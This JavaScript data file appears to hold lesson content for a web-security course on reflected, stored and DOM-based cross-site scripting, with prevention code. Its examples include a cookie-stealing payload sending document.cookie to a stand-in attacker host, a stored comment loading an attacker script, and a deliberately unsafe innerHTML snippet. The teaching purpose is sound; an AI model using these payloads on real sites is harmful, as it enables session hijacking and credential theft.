const pathsData = {
  xss: {
    title: "Cross-Site Scripting (XSS)",
    topics: {
      "understanding-xss-fundamentals": {
        title: "What is Cross-Site Scripting (XSS)? 🎯",

        content: [
          {
            type: "p",
            text: "Cross-Site Scripting (XSS) is a security vulnerability that allows an attacker to inject malicious scripts (usually JavaScript) into web pages viewed by other users. The goal is to have the victim's browser execute this code as if it were a legitimate part of the site, bypassing the same-origin policy.",
          },
          {
            type: "h2",
            text: "How It Works in Practice",
          },
          {
            type: "p",
            text: "Essentially, XSS exploits the trust a user has in a website, turning the site into a vehicle for delivering the malicious code. This happens when an application takes user input and includes it in the output without proper validation or encoding.",
          },
          {
            type: "h2",
            text: "The 3 Main Types of XSS",
          },
          {
            type: "p",
            text: "There are three main categories of XSS, distinguished by how the malicious code is delivered to the victim.",
          },
          {
            type: "p",
            text: "1. Reflected XSS",
          },
          {
            type: "p",
            text: "This is the most common type. The malicious script is contained within the HTTP request itself, usually in a URL parameter. The server 'reflects' this input back into the response page without properly handling it. How it works: The attacker sends a malicious link to the victim",
          },
          {
            type: "code",
            language: "html",
            text: `\nhttps://vulnerable-site.com/search?term=<script>stealCookies()</script>`,
          },
          {
            type: "p",
            text: "When clicked, the browser executes the script.",
          },
          {
            type: "p",
            text: "ㅤAnalogy: It's like a boomerang. The attacker throws the script at the server via the URL, and the server throws it right back to the victim's browser.",
          },
          {
            type: "p",
            text: "2. Stored XSS",
          },
          {
            type: "p",
            text: "This is the most dangerous type. The malicious script is permanently saved on the server, such as in a database. It is then served to every user who accesses the page where the script was stored.",
          },
          {
            type: "p",
            text: "ㅤHow it works: The attacker inserts the script into a field that gets saved, like a blog comment, a profile name, or a forum post.",
          },
          {
            type: "p",
            text: "ㅤAnalogy: It's like a landmine. The attacker plants the malicious code, and it is triggered by any user who visits that page.",
          },
          {
            type: "p",
            text: "3. DOM-based XSS",
          },
          {
            type: "p",
            text: "In this case, the vulnerability lies entirely within the client-side code. It occurs when a legitimate script on the page manipulates the DOM (Document Object Model) in an unsafe way, using user-supplied data.",
          },
          {
            type: "p",
            text: "ㅤHow it works: JavaScript on the page takes data from the URL (e.g., window.location.hash) and writes it directly into the page's HTML without sanitization.",
          },
          {
            type: "p",
            text: "ㅤAnalogy: It's self-sabotage. The page's own code, running in the browser, is tricked into performing a malicious action.",
          },
          {
            type: "h2",
            text: "What's the Potential Damage? 💥",
          },
          {
            type: "p",
            text: "A successful XSS attack can allow an attacker to:",
          },
          {
            type: "p",
            text: "ㅤ- Hijack the user's session: By stealing session cookies, the attacker can impersonate the victim.",
          },
          {
            type: "p",
            text: "ㅤ- Capture credentials: By injecting fake login forms or logging the user's keystrokes (keylogging).",
          },
          {
            type: "p",
            text: "ㅤ- Perform actions on the user's behalf: Such as transferring funds, deleting data, or changing permissions.",
          },
          {
            type: "p",
            text: "ㅤ- Modify the page's content: Altering the site's appearance (defacement) or displaying false information.",
          },
          {
            type: "h2",
            text: "How to Prevent XSS? 🛡️",
          },
          {
            type: "p",
            text: "Effective XSS prevention involves a layered approach, but the most important principle is to never trust user input.",
          },
          {
            type: "p",
            text: "ㅤ- Filter on Input: Validate and restrict data received from the user. Use allowlists of expected characters and formats.",
          },
          {
            type: "p",
            text: "ㅤ- Encode on Output: This is the most crucial defense. Before displaying any user-provided data on a page, encode it according to the context (HTML, JavaScript, URL, etc.). This tells the browser to treat the data as plain text, not as executable code.",
          },
          {
            type: "code",
            text: "Example: The < character becomes &lt; in an HTML context.",
          },
          {
            type: "p",
            text: "ㅤ-  Use Security Headers: Implement Content-Security-Policy (CSP) as an additional layer of defense. CSP can instruct the browser to only load scripts from trusted sources, mitigating the impact of any XSS flaw that might still exist.",
          },
        ],
      },
      "reflected-xss": {
        title: "In-Depth: Reflected XSS",
        content: [
          {
            type: "p",
            text: "Reflected XSS is the most common variety of Cross-Site Scripting. It gets its name from the fact that a malicious script is injected via an HTTP request (usually in the URL), and the server then reflects it back in the HTML response to the user's browser, which then executes it.",
          },
          {
            type: "p",
            text: "Analogy: Think of it like a boomerang. The attacker throws it at the server via a URL, and the server, unaware, throws it right back at the target: the victim's browser.",
          },
          {
            type: "p",
            text: "The key characteristic is that the script is not stored on the server. It only exists in the request and the response of that specific moment.",
          },
          {
            type: "h2",
            text: "The Lifecycle of a Reflected XSS Attack",
          },
          {
            type: "ol",
            items: [
              "Crafting: The attacker finds a vulnerability on a website (e.g., a search field) and creates a malicious URL containing a script they wish to execute in another person's browser.",
              "Delivery: The attacker must trick a victim into clicking this URL. This is usually done through social engineering: phishing emails, direct messages, social media posts, etc. The URL can be shortened or disguised to look legitimate.",
              "Reflection: The victim clicks the link. Their browser sends the request to the vulnerable server. The server takes the malicious part of the URL and inserts it directly into the HTML page it sends back as a response.",
              "Execution: The victim's browser receives the HTML page. Because the script came from a trusted server (the site they intended to visit), the browser executes it without hesitation. The attack is complete.",
            ],
          },
          {
            type: "h2",
            text: "Practical Example: A Vulnerable Search Website",
          },
          {
            type: "p",
            text: "Imagine a website with a search page at `http://vulnerable-site.com/search`.",
          },
          {
            type: "h3",
            text: "1. Normal Behavior:",
          },
          {
            type: "p",
            text: 'A user searches for "cats". The URL becomes:',
          },
          {
            type: "code",
            language: "text",
            text: "http://vulnerable-site.com/search?term=cats",
          },
          {
            type: "p",
            text: "The server responds with HTML that includes the search term:",
          },
          {
            type: "code",
            language: "html",
            text: "<h1>Search results for: cats</h1>\n<p>No results found.</p>",
          },
          {
            type: "h3",
            text: "2. The Attack:",
          },
          {
            type: "p",
            text: "The attacker notices the site doesn't sanitize the input and crafts the following URL:",
          },
          {
            type: "code",
            language: "text",
            text: "http://vulnerable-site.com/search?term=<script>alert('Your session has been compromised!')</script>",
          },
          {
            type: "p",
            text: "When the victim clicks this link, the server generates the following HTML:",
          },
          {
            type: "code",
            language: "html",
            text: "<h1>Search results for: <script>alert('Your session has been compromised!')</script></h1>",
          },
          {
            type: "p",
            text: "The victim's browser reads this HTML, finds the <script> tag, and executes it, displaying the alert.",
          },
          {
            type: "h3",
            text: "A More Realistic Payload (Cookie Theft):",
          },
          {
            type: "p",
            text: "An alert is just a proof of concept. A real attacker would use a script to steal the user's session cookie.",
          },
          {
            type: "code",
            language: "text",
            text: "<script>document.location='http://attacker-site.com/steal.php?cookie='+document.cookie</script>",
          },
          {
            type: "p",
            text: "When executed, this script grabs the victim's cookie and sends it to a server controlled by the attacker, who can then use it to impersonate the victim.",
          },
          {
            type: "h2",
            text: "How to Prevent Reflected XSS",
          },
          {
            type: "p",
            text: "Prevention focuses on one fundamental principle: never trust data that comes from the client. Any data from an HTTP request must be treated as potentially malicious before being inserted into the page.",
          },
          {
            type: "h3",
            text: "The Main Defense: Output Encoding",
          },
          {
            type: "p",
            text: 'The most effective way to stop Reflected XSS is to encode the data at the moment it is inserted into the HTML. This transforms special characters (like <, >, ") into their equivalent HTML entities, which the browser interprets as text, not code.',
          },
          {
            type: "code",
            language: "php",
            text: "<?php\n// Get the 'term' from the URL\n$term = $_GET['term'];\n\n// ENCODE the output before displaying it\n$safe_term = htmlspecialchars($term, ENT_QUOTES, 'UTF-8');\n\n// It is now safe to display the variable\necho \"<h1>Search results for: \" . $safe_term . \"</h1>\";\n?>",
          },
          {
            type: "p",
            text: "If the attacker injects <script>, the `htmlspecialchars` function will transform it into `&lt;script&gt;`. The browser will display the literal text <script> on the screen but will not execute it, neutralizing the attack.",
          },
        ],
      },
      "stored-xss": {
        title: "In-Depth: Stored XSS (Persistent)",
        content: [
          {
            type: "p",
            text: "Stored XSS, also known as Persistent or Second-Order XSS, is the most dangerous type of XSS vulnerability. It's named 'Stored' because the attacker's malicious script is permanently saved (persists) on the target server—for example, in a database, a comment field, a user profile, or a forum post.",
          },
          {
            type: "p",
            text: "Analogy: If Reflected XSS is a boomerang, Stored XSS is a landmine. The attacker plants it once, and it remains active, harming any user who visits the compromised page, potentially for a long time.",
          },
          {
            type: "p",
            text: "This makes it far more severe than Reflected XSS because it doesn't require the attacker to trick users into clicking a specific link. The victims are infected simply by browsing a legitimate, but compromised, page on the website.",
          },
          {
            type: "h2",
            text: "The Lifecycle of a Stored XSS Attack",
          },
          {
            type: "ol",
            items: [
              "Injection: The attacker submits data containing a malicious script to the web application. For instance, they post a comment on a blog.",
              "Storage: The application stores this malicious input in its database without properly sanitizing or validating it.",
              "Delivery: A victim later visits the website. They browse the page that displays the stored data (e.g., the blog post with the attacker's comment).",
              "Execution: The server retrieves the malicious data from the database and includes it in the HTML page sent to the victim. The victim's browser, trusting the server, executes the script because it appears to be a legitimate part of the page.",
            ],
          },
          {
            type: "h2",
            text: "Practical Example: A Vulnerable Blog Comment Section",
          },
          {
            type: "h3",
            text: "1. The Injection",
          },
          {
            type: "p",
            text: "An attacker posts the following comment on a blog:",
          },
          {
            type: "code",
            language: "html",
            text: "Hello, great post! <script src='http://attacker-site.com/malicious.js'></script>",
          },
          {
            type: "p",
            text: "The web application saves this exact string into the 'comments' table in its database.",
          },
          {
            type: "h3",
            text: "2. The Execution",
          },
          {
            type: "p",
            text: "Later, an innocent user (or even an administrator) visits this blog post. The server fetches all comments from the database, including the attacker's, and embeds them into the page.",
          },
          {
            type: "p",
            text: "The resulting HTML sent to the victim's browser looks like this:",
          },
          {
            type: "code",
            language: "html",
            text: "<div class='comment'>\n  <p>Hello, great post! <script src='http://attacker-site.com/malicious.js'></script></p>\n</div>",
          },
          {
            type: "p",
            text: "The browser immediately loads and executes `malicious.js` from the attacker's server. This script now runs with the victim's permissions, allowing it to steal their session cookies, modify the page, or perform actions on their behalf. Every single visitor to this page becomes a victim.",
          },
          {
            type: "h2",
            text: "How to Prevent Stored XSS",
          },
          {
            type: "p",
            text: "Prevention requires a two-layered defense: filtering what you save, and encoding what you display.",
          },
          {
            type: "h3",
            text: "Defense 1: Input Validation / Sanitization",
          },
          {
            type: "p",
            text: "As a first line of defense, validate and sanitize data before saving it to the database. For example, you could strip out all HTML tags from a comment. However, this is not foolproof and can break legitimate user input (e.g., a user trying to write about HTML).",
          },
          {
            type: "h3",
            text: "Defense 2: Output Encoding (The Most Critical Defense)",
          },
          {
            type: "p",
            text: "This is the ultimate protection. Regardless of what is stored in your database, you must always encode data before rendering it in an HTML response. This is the same critical defense used for Reflected XSS.",
          },
          {
            type: "code",
            language: "php",
            text: "<?php\n// Fetch the comment from the database\n$comment_from_db = $row['comment']; // e.g., \"<script>...\" \n\n// ALWAYS encode data just before you output it\n$safe_comment = htmlspecialchars($comment_from_db, ENT_QUOTES, 'UTF-8');\n\necho \"<div class='comment'><p>\" . $safe_comment . \"</p></div>\";\n?>",
          },
          {
            type: "p",
            text: "This ensures that even if a malicious script is sitting in your database, it gets converted to harmless text (`&lt;script&gt;...`) in the browser, completely neutralizing the attack.",
          },
        ],
      },
      "dom-based-xss": {
        title: "In-Depth: DOM-based XSS",
        content: [
          {
            type: "p",
            text: "DOM-based XSS is a more subtle type of XSS where the vulnerability exists entirely in the client-side code (JavaScript) that executes on a page. The attack occurs when a script on the page takes untrusted data (a 'source') and passes it to an unsafe function (a 'sink') that modifies the page's Document Object Model (DOM).",
          },
          {
            type: "p",
            text: "Analogy: Think of it as self-sabotage. The server sends a perfectly safe page, but a script already on that page is tricked into executing malicious code by data it reads from the URL or another client-side source.",
          },
          {
            type: "p",
            text: "A key feature is that the server may be completely unaware of the attack. Often, the payload is in the URL fragment (#), which is never sent to the server.",
          },
          {
            type: "h2",
            text: "The Concept of Sources and Sinks",
          },
          {
            type: "p",
            text: "Understanding DOM-based XSS requires knowing two concepts:",
          },
          {
            type: "ol",
            items: [
              "Source: Where the untrusted data comes from. Common sources include `document.URL`, `location.hash`, `location.search`, and `document.referrer`.",
              "Sink: An unsafe JavaScript function or property that can execute code if it's passed malicious data. Dangerous sinks include `element.innerHTML`, `document.write()`, and the infamous `eval()`.",
            ],
          },
          {
            type: "h2",
            text: "Practical Example: A Client-Side Welcome Message",
          },
          {
            type: "p",
            text: "Imagine a page that greets users by taking their name from the URL fragment, like `http://example.com/welcome.html#Daniel`.",
          },
          {
            type: "h3",
            text: "1. The Vulnerable JavaScript Code",
          },
          {
            type: "p",
            text: "The page contains the following script to display the welcome message:",
          },
          {
            type: "code",
            language: "javascript",
            text: "function greetUser() {\n  let name = window.location.hash.substring(1); // Source: Reads from the URL fragment\n  document.getElementById('welcome-message').innerHTML = 'Hello, ' + name; // Sink: Unsafely writes to the DOM\n}\ngreetUser();",
          },
          {
            type: "h3",
            text: "2. The Attack",
          },
          {
            type: "p",
            text: "An attacker crafts a malicious URL and sends it to a victim:",
          },
          {
            type: "code",
            language: "text",
            text: "http://example.com/welcome.html#<img src=x onerror=alert('XSS')>",
          },
          {
            type: "p",
            text: "When the victim visits this page, the JavaScript runs as intended. It reads the string `<img src=x onerror=alert('XSS')>` from the `location.hash` (the source). It then passes this string to the `innerHTML` property (the sink), which causes the browser to parse it as HTML. The invalid `<img>` tag triggers the `onerror` event, executing the attacker's alert.",
          },
          {
            type: "h2",
            text: "How to Prevent DOM-based XSS",
          },
          {
            type: "p",
            text: "Since the vulnerability is on the client-side, the prevention must also happen there.",
          },
          {
            type: "h3",
            text: "Rule 1: Use Safe Sinks",
          },
          {
            type: "p",
            text: "The best defense is to avoid dangerous sinks. Whenever you are writing data to the DOM that should only be text, use safe properties like `.textContent` instead of `.innerHTML`.",
          },
          {
            type: "p",
            text: "The corrected, safe version of the script would be:",
          },
          {
            type: "code",
            language: "javascript",
            text: "function greetUser() {\n  let name = window.location.hash.substring(1);\n  // Using .textContent is safe because it does not parse HTML\n  document.getElementById('welcome-message').textContent = 'Hello, ' + name;\n}\ngreetUser();",
          },
          {
            type: "p",
            text: "Now, if the malicious payload is passed, the browser will literally display the string `<img src=x onerror=alert('XSS')>` on the page as plain text, completely preventing the attack.",
          },
          {
            type: "h3",
            text: "Rule 2: Sanitize Data on the Client-Side",
          },
          {
            type: "p",
            text: "If your application genuinely needs to write dynamic HTML to the page from a source, the data must be rigorously sanitized on the client-side before being passed to a sink. Use a well-vetted library like DOMPurify for this task, as creating a secure sanitizer yourself is extremely difficult.",
          },
        ],
      },
    },
  },
};

export default pathsData;
